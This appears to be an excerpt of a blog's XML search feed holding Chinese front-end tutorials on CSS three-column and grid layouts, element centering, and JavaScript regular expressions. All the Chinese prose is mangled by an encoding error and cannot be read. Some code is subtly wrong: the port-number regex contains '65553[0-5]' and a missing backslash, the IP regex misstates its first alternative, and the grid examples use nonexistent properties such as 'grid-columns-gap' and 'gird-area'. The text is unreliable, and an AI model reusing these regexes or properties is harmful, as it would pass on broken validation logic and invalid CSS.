&lt;/article&gt; &lt;article class="center"&gt; &lt;h1&gt;æˆ‘æ˜¯gridæ …æ ¼å¸ƒå±€ä¸­é—´æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯gridæ …æ ¼å¸ƒå±€å³æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt; æ–¹å¼å…­ï¼šåœ£æ¯å¸ƒå±€ç¼ºç‚¹ï¼šéœ€è¦å¤šåŠ ä¸€å±‚æ ‡ç­¾ï¼Œhtmlé¡ºåºä¸å¯¹ï¼Œå ç”¨äº†å¸ƒå±€æ¡†çš„marginå±žæ€§ 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;style&gt; .tree-columns-layout.cup:after &#123; clear: both; content: ""; display: table; &#125; .tree-columns-layout.cup .center &#123; width: 100%; float: left; &#125; .tree-columns-layout.cup .center &gt; div &#123; margin: 0 300px; overflow: auto; background-color: #aa0; &#125; .tree-columns-layout.cup .left &#123; width: 300px; float: left; margin-left: -100%; background-color: #a00; &#125; .tree-columns-layout.cup .right &#123; width: 300px; float: left; margin-left: -300px; background-color: #0aa; &#125;&lt;/style&gt;&lt;section class="tree-columns-layout cup"&gt; &lt;article class="center"&gt; &lt;div&gt; &lt;h1&gt;æˆ‘æ˜¯åœ£æ¯å¸ƒå±€ä¸­é—´æ¡†&lt;/h1&gt; &lt;/div&gt; &lt;/article&gt; &lt;article class="left"&gt; &lt;h1&gt;æˆ‘æ˜¯åœ£æ¯å¸ƒå±€å·¦æ¡†&lt;/h1&gt; &lt;/article&gt; &lt;article class="right"&gt; &lt;h1&gt;æˆ‘æ˜¯åœ£æ¯å¸ƒå±€å³æ¡†&lt;/h1&gt; &lt;/article&gt;&lt;/section&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>å¸ƒå±€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2F2018%2F06%2F22%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[å¯¹å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œä¸€èˆ¬åˆ†ä¸ºå­—ç¬¦ä¸²æ“ä½œå’Œæ­£åˆ™æ“ä½œã€‚ å­—ç¬¦ä¸²æ“ä½œ str.search(regStr) è¿”å›ž regStr åœ¨ str ä¸­ç¬¬ä¸€ä¸ªå‡ºçŽ°çš„ä½ç½® str.replace(regStr,newStr) è¿”å›žæ›¿æ¢åœ¨ str ä¸­ regStr åŽå­—ç¬¦ä¸² str.substring(n1,n2) è¿”å›ž str ä»Ž n1 ä½ç½®åˆ° n2 ä½ç½®å‰ä¸€ä¸ªå­—ç¬¦ä¸² str.chartAt(n) è¿”å›ž n ä½ç½®å­—ç¬¦ str.split(regStr) è¿”å›žä»¥ regStr éš”å¼€çš„æ•°ç»„ str.match(reg) è¿”å›žåœ¨ str ä¸­ç¬¦åˆæ­£åˆ™ reg çš„å­—ç¬¦ä¸²æ•°ç»„ æ­£åˆ™æ“ä½œvar reg=new RegExp(regStr,â€™iâ€™); //åˆ›å»ºæ­£åˆ™å¯¹è±¡ var reg=/regStr/i; //éšå¼åˆ›å»ºæ­£åˆ™å¯¹è±¡ reg.test(str) str æ˜¯å¦åŒ…å« reg è¿”å›ž true/false reg.exec(str) è¿”å›žåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å’Œæœ€åŽä¸€æ¬¡çš„åŒ¹é…å­—ç¬¦ä¸²æœ€åŽä½ç½®çš„ä¸‹ä¸€ä¸ªç´¢å¼• åŸºç¡€ç”¨æ³• /a|b/ a æˆ– b /[abc]/ a æˆ– b æˆ– c /[a-zA-Z0-9]/ æ‰€æœ‰æ•°å­—å’Œå­—æ¯ /[^a-za-z0-9]/ é™¤äº†æ•°å­—å’Œå­—æ¯ /.+/ ä»»æ„å­—ç¬¦ /\d/ ç­‰ä»·äºŽ/[0-9]/ æ•°å­— /\w/ ç­‰ä»·äºŽ/[a-z0-9_]/ æ•°å­—ã€å­—æ¯å’Œä¸‹åˆ’çº¿ /\s/ ç­‰ä»·äºŽ/â€œ â€œ/ ç©ºæ ¼ /\D/ ç­‰ä»·äºŽ/[^0-9]/ éžæ•°å­— /\W/ ç­‰ä»·äºŽ/[^a-z0-9_]/ é™¤äº†æ•°å­—ã€å­—æ¯å’Œåˆ’çº¿ /\S/ ç­‰ä»·äºŽ/[^â€ â€œ]/ é™¤äº†ç©ºæ ¼ /\d{n,m}/ æ•°å­—æœ€å°‘å‡ºçŽ° n æ¬¡ï¼Œæœ€å¤šå‡ºçŽ° m æ¬¡ /\d{1,}/ ç­‰ä»·äºŽ/\d+/ æ•°å­—æœ€å°‘å‡ºçŽ° 1 æ¬¡ /\d{0,}/ ç­‰ä»·äºŽ/\d*/ æ•°å­—æœ€å°‘å‡ºçŽ° 0 æ¬¡ /\d{0,1}/ ç­‰ä»·äºŽ/\d?/ æ•°å­—æœ€å¤šå‡ºçŽ° 1 æ¬¡ /^\d$/ ä»¥æ•°å­—å¼€å¤´ä¸”ä»¥æ•°å­—ç»“å°¾ /[\u4e00-\u9fa5]/ æ±‰å­—åŒ¹é…èŒƒå›´ \b å•è¯è¾¹ç•Œ \B éžå•è¯è¾¹ç•Œ ?=n åŒ¹é…ä»»ä½•å…¶åŽç´§æŽ¥æŒ‡å®šå­—ç¬¦ä¸² n çš„å­—ç¬¦ä¸² ?!n åŒ¹é…ä»»ä½•å…¶åŽæ²¡æœ‰ç´§æŽ¥æŒ‡å®šå­—ç¬¦ä¸² n çš„å­—ç¬¦ä¸² ç–‘éš¾ç‚¹åœ¨ä¸ªäººæŽ¥è§¦æ­£åˆ™è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›ä¸æ˜“ç†è§£çš„åœ°æ–¹ ç”¨åœ†æ‹¬å·å°†æ‰€æœ‰é€‰æ‹©é¡¹æ‹¬èµ·æ¥ï¼Œç›¸é‚»çš„é€‰æ‹©é¡¹ä¹‹é—´ç”¨|åˆ†éš”ã€‚ä½†ç”¨åœ†æ‹¬å·ä¼šæœ‰ä¸€ä¸ªå‰¯ä½œç”¨ï¼Œæ˜¯ç›¸å…³çš„åŒ¹é…ä¼šè¢«ç¼“å­˜ï¼Œæ­¤æ—¶å¯ç”¨?:æ”¾åœ¨ç¬¬ä¸€ä¸ªé€‰é¡¹å‰æ¥æ¶ˆé™¤è¿™ç§å‰¯ä½œç”¨ã€‚å…¶ä¸­?:æ˜¯éžæ•èŽ·å…ƒä¹‹ä¸€ï¼Œè¿˜æœ‰ä¸¤ä¸ªéžæ•èŽ·å…ƒæ˜¯?=å’Œ?!ï¼Œè¿™ä¸¤ä¸ªè¿˜æœ‰æ›´å¤šçš„å«ä¹‰ï¼Œå‰è€…ä¸ºæ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹åŒ¹é…åœ†æ‹¬å·å†…çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ï¼ŒåŽè€…ä¸ºè´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•å¼€å§‹ä¸åŒ¹é…è¯¥æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼çš„ä½ç½®æ¥åŒ¹é…æœç´¢å­—ç¬¦ä¸²ã€‚ è¡¨è¾¾å¼ æè¿° (?:pattern) åŒ¹é… pattern ä½†ä¸èŽ·å–åŒ¹é…ç»“æžœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åŽä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨ â€œæˆ–â€ å­—ç¬¦ (\ ) æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œ â€˜industr(?:y\ ies) å°±æ˜¯ä¸€ä¸ªæ¯” â€˜industry\ industriesâ€™ æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚ (?=pattern æ­£å‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•åŒ¹é… pattern çš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦èŽ·å–ä¾›ä»¥åŽä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œâ€™Windows (?=95\ 98\ NT\ 2000)â€™ èƒ½åŒ¹é… â€œWindows 2000â€ ä¸­çš„ â€œWindowsâ€ ï¼Œä½†ä¸èƒ½åŒ¹é… â€œWindows 3.1â€ ä¸­çš„ â€œWindowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”ŸåŽï¼Œåœ¨æœ€åŽä¸€æ¬¡åŒ¹é…ä¹‹åŽç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»ŽåŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åŽå¼€å§‹ã€‚ (?!pattern) è´Ÿå‘é¢„æŸ¥ï¼Œåœ¨ä»»ä½•ä¸åŒ¹é… pattern çš„å­—ç¬¦ä¸²å¼€å§‹å¤„åŒ¹é…æŸ¥æ‰¾å­—ç¬¦ä¸²ã€‚è¿™æ˜¯ä¸€ä¸ªéžèŽ·å–åŒ¹é…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥åŒ¹é…ä¸éœ€è¦èŽ·å–ä¾›ä»¥åŽä½¿ç”¨ã€‚ä¾‹å¦‚â€™Windows (?!95\ 98\ NT\ 2000)â€™ èƒ½åŒ¹é… â€œWindows 3.1â€ ä¸­çš„ â€œWindowsâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œWindows 2000â€ ä¸­çš„ â€œWindowsâ€ã€‚é¢„æŸ¥ä¸æ¶ˆè€—å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä¸€ä¸ªåŒ¹é…å‘ç”ŸåŽï¼Œåœ¨æœ€åŽä¸€æ¬¡åŒ¹é…ä¹‹åŽç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡åŒ¹é…çš„æœç´¢ï¼Œè€Œä¸æ˜¯ä»ŽåŒ…å«é¢„æŸ¥çš„å­—ç¬¦ä¹‹åŽå¼€å§‹ã€‚ ä¸€ç›´å¯¹æ­£åˆ™ä¸­çš„ match å’Œ exec ä¸æ˜“åˆ†æ¸…ï¼Œä¸‹é¢æ¥åšä¸€ä¸‹æ¯”è¾ƒã€‚ 1. matchmatch æ–¹æ³•å±žäºŽ String æ­£åˆ™è¡¨è¾¾æ–¹æ³• è¯­æ³•: 1str.match(regexp) strï¼šè¦è¿›è¡ŒåŒ¹é…çš„å­—ç¬¦ä¸² regexpï¼šä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼(æˆ–è€…ç”± RegExp()æž„é€ æˆçš„æ­£åˆ™è¡¨è¾¾å¼) match çš„ç”¨æ³•ä¸»è¦åŒºåˆ†å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼æ˜¯å¦æœ‰å…¨å±€æ ‡ç¤º g å¦‚æžœæœ‰ g å…¨å±€æ ‡å¿—ï¼Œé‚£ä¹ˆè¿”å›žçš„æ•°ç»„ä¿å­˜çš„æ˜¯ï¼Œæ‰€æœ‰åŒ¹é…çš„å†…å®¹ã€‚ å¦‚æžœæ²¡æœ‰ g å…¨å±€æ ‡å¿—ï¼Œé‚£ä¹ˆè¿”å›žçš„æ•°ç»„ arr.arr[0]ä¿å­˜çš„æ˜¯å®Œæ•´çš„åŒ¹é….arr[1]ä¿å­˜çš„æ˜¯ç¬¬ä¸€ä¸ªæ‹¬å·é‡Œæ•èŽ·çš„å­—ä¸²ï¼Œä¾æ­¤ç±»æŽ¨ arr[n]ä¿å­˜çš„æ˜¯ç¬¬ n ä¸ªæ‹¬å·æ•èŽ·çš„å†…å®¹ã€‚ 2. execä¸Ž match æ–¹æ³•ä¸åŒ exec å±žäºŽæ­£åˆ™è¡¨è¾¾å¼çš„æ–¹æ³• è¯­æ³•ï¼š 1var result1 = regexp.exec(str); regexpï¼šæ­£åˆ™è¡¨è¾¾å¼ strï¼šè¦åŒ¹é…çš„å­—ä¸² exec ä¸Ž match çš„å…³è”å°±æ˜¯ execï¼ˆg æœ‰æ²¡æœ‰éƒ½æ— å½±å“ï¼‰å°±ç­‰ä»·äºŽä¸å«æœ‰ g å…¨å±€æ ‡å¿—çš„ matchï¼Œå³è¿”å›žæ•°ç»„ arr[0]ä¸ºåŒ¹é…çš„å®Œæ•´ä¸²ï¼Œå…¶ä½™çš„ä¸ºæ‹¬å·é‡Œæ•èŽ·çš„å­—ç¬¦ä¸²ã€‚ ä½†å¦‚æžœæœ‰ g å¯¹ exec æœ¬èº«çš„å½±å“æ˜¯ï¼Œå½“ä¸€ä¸ªå…·æœ‰ g çš„æ­£åˆ™è¡¨è¾¾å¼è°ƒç”¨ exec()æ—¶ï¼Œä»–å°†è¯¥å¯¹è±¡çš„ lastIndex è®¾ç½®åˆ°ç´§æŽ¥è¿™åŒ¹é…å­ä¸²çš„å­—ç¬¦ä½ç½®ã€‚å½“ç¬¬äºŒæ¬¡è°ƒç”¨ exec æ—¶å°†ä»ŽlastIndex æ‰€æŒ‡ç¤ºçš„å­—ç¬¦ä½ç½®å¼€å§‹æ£€ç´¢ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å¯ä»¥åå¤è°ƒç”¨ exec éåŽ†æ‰€æœ‰åŒ¹é…ï¼Œç­‰ä»·äºŽ match å…·æœ‰ g æ ‡å¿—ã€‚ 1234var arrmatch = str.match(reg);for(var i =0; i &lt; arrmatch.length; i++)&#123; document.write(arrmatch[i] +&quot;----&gt;&quot;);&#125; å¯è§ä¸Šé¢çš„ exec å’Œ match æ˜¯ç­‰ä»·çš„. reg.exec(str) è¿”å›žåŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å’Œæœ€åŽä¸€æ¬¡çš„åŒ¹é…å­—ç¬¦ä¸²æœ€åŽä½ç½®çš„ä¸‹ä¸€ä¸ªç´¢å¼•å¦‚ï¼š 1234567891011121314var str = &quot;abc123bef345olj89,ed&quot;;var reg = /\d+/g;console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex);console.log(reg.exec(str));console.log(reg.lastIndex); ç»“æžœ æ€»ç»“ ä¸»è¦åŒºåˆ† match å…·æœ‰ g å’Œæ²¡æœ‰ g çš„åŒºåˆ«ï¼Œæ²¡æœ‰ g çš„æ—¶å€™ä¸Ž exec æ˜¯ç­‰ä»·çš„ã€‚ è€Œ exec è¿”å›žçš„ä¸²ç±»åž‹ä¸å— g å½±å“ï¼Œä½†å…·æœ‰ g æ—¶å€™ä¼šé©±åŠ¨ lastIndex å¯ä»¥æ¨¡æ‹ŸéåŽ†æ‰€æœ‰åŒ¹é…ï¼Œå¯ä»¥ä¸Ž match å…·æœ‰ g çš„æ—¶å€™ç­‰ä»·ã€‚ é¡ºä¾¿åŠ å¼ºç†è§£ ip æ­£åˆ™è¡¨è¾¾å¼æ ¼å¼ç”±â€.â€åˆ†å‰²æˆå››æ®µï¼Œæ¯ä¸€æ®µèŒƒå›´æ˜¯ 0-255ï¼Œæ‹¿å‡ºå…¶ä¸­ä¸€æ®µè¿›è¡Œåˆ†æž èŒƒå›´ è¡¨è¾¾å¼ 0-9 \d 10-99 [1-9]\d 100-199 1\d{2} 200-249 2[0-4]\d 250-255 25[0-5] æ‰€ä»¥ï¼Œå…¶ä¸­ä¸€æ®µæž„æˆçš„æ­£åˆ™è¡¨è¾¾å¼æ˜¯ 1\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5] ï¼Œæ•´ä¸ª ip æ­£åˆ™ä¸º 1/^(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])$/ åŒç†ç«¯å£å·èŒƒå›´æ˜¯ 0-65535 èŒƒå›´ è¡¨è¾¾å¼ 0-9 \d 10-99 [1-9]\d 100-999 [1-9]\d{2} 1000-9999 [1-9]\d{3} 10000-59999 [1-5]\d{4} 60000-64999 6[0-4]\d{3} 65000-65499 65[0-4]\d{2} 65500-65529 655[0-2]\d 65530-65535 65553[0-5] æ‰€ä»¥ï¼Œæ•´ä¸ªç«¯å£å·æ­£åˆ™ä¸º 1/\d|[1-9]\d&#123;1,3&#125;|[1-5]d&#123;4&#125;|6[0-4]\d&#123;3&#125;|65[0-4]\d&#123;2&#125;|655[0-2]\d|65553[0-5]/ å‚è€ƒèœé¸Ÿæ•™ç¨‹æ­£åˆ™æ•™ç¨‹]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript æ­£åˆ™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gridæ …æ ¼å¸ƒå±€]]></title>
    <url>%2F2018%2F06%2F15%2Fgrid%E6%A0%85%E6%A0%BC%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[1ã€åŽ†å²å››ä¸ªå¸ƒå±€é˜¶æ®µç½‘é¡µå¸ƒå±€ç»åŽ†äº†å››ä¸ªåŽ†å²é˜¶æ®µï¼š tableå¸ƒå±€ï¼› floatå’Œpositionå¸ƒå±€ï¼› flexå¸ƒå±€ï¼Œè§£å†³äº†ä¼ ç»Ÿå¸ƒå±€æ–¹æ¡ˆä¸‰å¤§ç—›ç‚¹ï¼šæŽ’åˆ—æ–¹å‘ã€å¯¹é½æ–¹å¼å’Œè‡ªé€‚åº”å°ºå¯¸ï¼› gridå¸ƒå±€ï¼ŒäºŒç»´å¸ƒå±€æ¨¡å—ï¼Œå…·æœ‰å¼ºå¤§çš„å†…å®¹å°ºå¯¸å’Œå®šä½èƒ½åŠ›ã€‚ flexåˆ†ä¸ºä¼¸ç¼©å®¹å™¨å’Œä¼¸ç¼©é¡¹ç›®ï¼Œgridåˆ†ä¸ºç½‘æ ¼å®¹å™¨å’Œç½‘æ ¼é¡¹ç›®ã€‚ 2ã€gridå¸ƒå±€-ç½‘æ ¼å®¹å™¨2.1 æ˜¾ç¤ºç½‘æ ¼ä½¿ç”¨grid-template-columnså’Œgrid-template-rowså¯ä»¥æ˜¾å¼è®¾ç½®ä¸€ä¸ªç½‘æ ¼çš„åˆ—ï¼ˆå®½ï¼‰å’Œè¡Œï¼ˆé«˜ï¼‰ã€‚ 12345&lt;!--gridå¸ƒå±€è®¾ç½®è¡Œé«˜--&gt;.grid &#123; display: grid; grid-template-rows: 60px 40px;&#125; 1234.grid &#123; display: grid; grid-template-columns: 40px 50px 60px;&#125; frå•ä½è¡¨ç¤ºç½‘æ ¼å®¹å™¨ä¸­å¯ç”¨ç©ºé—´æŒ‰æ¯”åˆ—åˆ†é…ã€‚ 12345.grid &#123; display: grid; grid-template-rows: 1fr 2fr; grid-template-colums: 1fr 1fr 2fr;&#125; minmax()å‡½æ•°æ¥åˆ›å»ºç½‘æ ¼è½¨é“çš„æœ€å°æˆ–æœ€å¤§å°ºå¯¸ã€‚ 12345.grid &#123; display: grid; grid-template-rows: minmax(100px, auto); grid-template-columns: 1fr 1fr 2fr;&#125; ä½¿ç”¨repeat()å¯ä»¥åˆ›å»ºé‡å¤çš„ç½‘ç»œè½¨é“ï¼Œé€‚ç”¨äºŽåˆ›å»ºç›¸ç­‰å°ºå¯¸çš„ç½‘æ ¼é¡¹ç›®å’Œå¤šä¸ªç½‘æ ¼é¡¹ç›®ã€‚ 12345.grid &#123; display: grid; grid-template-columns: 30px repeat(3, 1fr) 30px; grid-template-rows: repeat(3, 1fr);&#125; 2.2 é—´è· grid-columns-gap: åˆ—ä¸Žåˆ—ä¹‹é—´çš„é—´è· grid-rows-gap: è¡Œä¸Žè¡Œä¹‹é—´çš„é—´è· grid-gap: grid-columns-gapå’Œgrid-rows-gapçš„ç¼©å†™ 123456.grid &#123; display: grid; grid-template-columns: 1fr 1fr 2fr; grid-template-rows: 1fr 2fr; grid-gap: 5px 10px;&#125; 3ã€gridå¸ƒå±€-ç½‘æ ¼é¡¹ç›®é€šè¿‡ç½‘æ ¼çº¿å¯ä»¥å®šä½ç½‘æ ¼é¡¹ç›®ã€‚ç½‘æ ¼çº¿å®žé™…ä¸Šæ˜¯ä»£è¡¨çº¿çš„å¼€å§‹ã€ç»“æŸï¼Œä¸¤è€…ä¹‹é—´å°±æ˜¯ç½‘æ ¼åˆ—è¡¨æˆ–è¡Œã€‚æ¯æ¡çº¿æ˜¯ä»Žç½‘æ ¼è½¨é“å¼€å§‹ï¼Œç½‘æ ¼çš„ç½‘æ ¼çº¿ä»Ž1å¼€å§‹ï¼Œæ¯æ¡ç½‘æ ¼çº¿é€æ­¥å¢žåŠ 1ã€‚ 1234567891011.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 2fr;&#125;.item1 &#123; grid-rows-start: 2; grid-columns-start: 2; grid-columns-end: 4;&#125; grid-rowæ˜¯grid-row-startå’Œgrid-row-endçš„ç®€å†™ã€‚grid-columnsæ˜¯grid-columns-startå’Œgrid-columns-endçš„ç®€å†™ã€‚ å…³é”®å­—spanåŽé¢ç´§éšæ•°å­—ï¼Œè¡¨ç¤ºåˆå¹¶å¤šå°‘ä¸ªåˆ—æˆ–è¡Œ 12345678910.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr;&#125;.item1 &#123; grid-row: 2/span 2; grid-column: span 3;&#125; grid-area æŒ‡å®šå››ä¸ªå€¼ï¼Œ1ï¼šgrid-row-start 2: grid-column-start 3: grid-row-end 4: grid-column-end 123456789.grid &#123; display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr;&#125;.item1 &#123; gird-area: 1/2/2/4;&#125; gridç›®å‰çš„æ”¯æŒåº¦è¿˜ä¸æ˜¯å¾ˆå¤šï¼ŒIEå®Œå…¨ä¸æ”¯æŒï¼Œæ”¯æŒçš„æµè§ˆå™¨æœ‰Firefox 52, Safari 10.1, Chrome 57, Opera 44ï¼Œäº†è§£ä¸Šé¢è¿™äº›å°±å¤Ÿäº†ï¼Œæ·±å…¥äº†è§£å…¶ä»–ç‰¹æ€§]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ°´å¹³ä¸”åž‚ç›´å±…ä¸­æ–¹æ³•ï¼ˆ10ç§ï¼‰]]></title>
    <url>%2F2018%2F06%2F01%2Fhorizontally-centered-vertically%2F</url>
    <content type="text"><![CDATA[å‰è¨€æ°´å¹³ä¸”åž‚ç›´å±…ä¸­æ–¹æ³•æœ‰å“ªäº›ï¼Ÿè¿™åœ¨å®žé™…å·¥ä½œä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°è®°ä¸€ä¸‹ã€‚ æ¼”ç¤ºHTMLç»“æž„1234567&lt;div id="div1" class="div"&gt; &lt;div id="div2"&gt; &lt;div id="div3"&gt; &lt;span&gt;i&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; åŸºæœ¬æ€æƒ³ä¸€èˆ¬çš„ï¼Œæ°´å¹³å±…ä¸­ç›¸å¯¹åž‚ç›´å±…ä¸­ç®€å•å¾ˆå¤šï¼Œå¯¹äºŽå†…è”å…ƒç´ ï¼ˆinlineã€inline-blockã€inline-tableå’Œinline-flexï¼‰ï¼Œçˆ¶çº§å…ƒç´ è®¾ç½®text-align: center;ï¼›å¯¹äºŽå—çº§å…ƒç´ ï¼Œå­çº§å…ƒç´ è®¾ç½®margin: 0 auto;ã€‚ä»¥ä¸‹ç»“åˆæ°´å¹³å±…ä¸­å¼ºè°ƒå®žçŽ°åž‚ç›´å±…ä¸­ã€‚ 1ã€å·²çŸ¥çˆ¶çº§å…ƒç´ å®½é«˜ï¼Œçˆ¶çº§å…ƒç´ å®šä½éž static ï¼Œå­çº§å…ƒç´ å®šä½è®¾ä¸º position: absolute/fixed ï¼Œå†åˆ©ç”¨ margin ã€ left å’Œ top å±žæ€§å±…ä¸­ã€‚1234567891011121314151617#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; position: absolute; top: 50%; left: 50%; margin-left: -50px; margin-top: -50px; background-color: #ff00ff;&#125; æ³¨ï¼šéœ€è¦å·²çŸ¥çˆ¶çº§å…ƒç´ å›ºå®šå®½é«˜ï¼Œæ‰èƒ½ç¡®å®š margin-left å’Œ margin-right ã€‚ 2ã€å­çº§å…ƒç´ æ˜¯å†…è”å…ƒç´ ï¼Œçˆ¶çº§å…ƒç´ è®¾ç½® line-height å±žæ€§åž‚ç›´å±…ä¸­ã€‚1234567891011121314151617#div1 &#123; width: 200px; height: 200px; line-height: 120px; text-align: center; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; line-height: normal; text-align: left; display: inline-block; background-color: #ff00ff;&#125; æ³¨ï¼šéœ€è¦å·²çŸ¥çˆ¶çº§å…ƒç´ çš„å›ºå®šé«˜åº¦ï¼Œæ‰å¯ä»¥ç¡®å®šline-heightã€‚ 3ã€å­çº§å…ƒç´ æ˜¯å†…è”å…ƒç´ ï¼Œçˆ¶çº§å…ƒç´ ç”¨ display: table-cell; å’Œ vertical-align: middle; å±žæ€§å®žçŽ°åž‚ç›´å±…ä¸­ã€‚123456789101112131415#div1 &#123; width: 200px; height: 200px; display: table-cell; text-align: center; vertical-align: middle; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; display: inline-block; background-color: #ff00ff;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œinline-block ã€ table-cell ä¸å…¼å®¹ie67 çœ‹åˆ°è¿˜æœ‰ä¸€ç§æ–¹æ¡ˆï¼Œæ˜¯å€ŸåŠ©ä¼ªå…ƒç´  ::after å°†å®¹å™¨æ’‘é«˜ï¼Œå®žçŽ°å†…è”å…ƒç´ åž‚ç›´å±…ä¸­ 1234567891011121314151617181920#div1 &#123; width: 200px; height: 200px; background-color: #ffff00; text-align: center;&#125;#div1::after &#123; content: ""; display: inline-block; height: 100%; vertical-align: middle;&#125;#div2 &#123; width: 100px; display: inline-block; background-color: #cccccc; vertical-align: middle;&#125; ç¼ºç‚¹ï¼šè¾ƒéš¾ä»¥ç†è§£ï¼Œåªé€‚ç”¨äºŽä¸€ä¸ªå­çº§å†…è”å…ƒç´ ï¼ˆæœ‰å¤šä¸ªå­å…ƒç´ ä¸é€‚ç”¨ï¼‰ 4ã€å¯¹äºŽå­çº§æ˜¯å—çº§å…ƒç´ ï¼Œçˆ¶çº§å…ƒç´ åŒæ ·ç”¨ display: table-cell; å’Œ vertical-align: middle; å±žæ€§å®žçŽ°åž‚ç›´å±…ä¸­ï¼Œæ°´å¹³æ–¹å‘å±…ä¸­ç”¨ margin: 0 auto; ã€‚1234567891011121314#div1 &#123; width: 200px; height: 200px; display: table-cell; vertical-align: middle; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; margin: 0 auto; background-color: #ff00ff;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œtable-cellä¸å…¼å®¹ie67 5ã€åˆ©ç”¨css3 translate ç‰¹æ€§ï¼šä½ç§»æ˜¯åŸºäºŽå…ƒç´ å®½é«˜çš„ã€‚12345678910111213141516171819#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); -webkit-transform: translate(-50%, -50%); -moz-transform: translate(-50%, -50%); -ms-transform: translate(-50%, -50%); background-color: #ff00ff;&#125; æ³¨ï¼šæ— éœ€è¦ç¡®å®šçˆ¶çº§å…ƒç´ çš„å®½é«˜ï¼Œtranslateå±žæ€§å…¼å®¹IE9+ 6ã€å½“çˆ¶çº§æ˜¯æµ®åŠ¨çš„ï¼Œç”¨ display: table-cell; ä¼šå¤±æ•ˆï¼Œè¿™æ—¶éœ€è¦åŒ…ä¸‰å±‚ï¼Œç¬¬ä¸€å±‚ display: table;ï¼Œç¬¬äºŒå±‚ display: table-cell; ç¬¬ä¸‰æ¬¡å±…ä¸­å±‚12345678910111213141516171819202122232425#div1 &#123; width: 200px; height: 200px; position: relative; display: table; background-color: #ffff00; float: left;&#125;#div2 &#123; width: 100%; height: 100%; display: table-cell; vertical-align: middle; /* text-align: center; */ background-color: #cccccc;&#125;#div3 &#123; width: 100px; height: 100px; margin: 0 auto; /* display: inline-block; */ background-color: #ff00ff;&#125; æ³¨ï¼šæ— 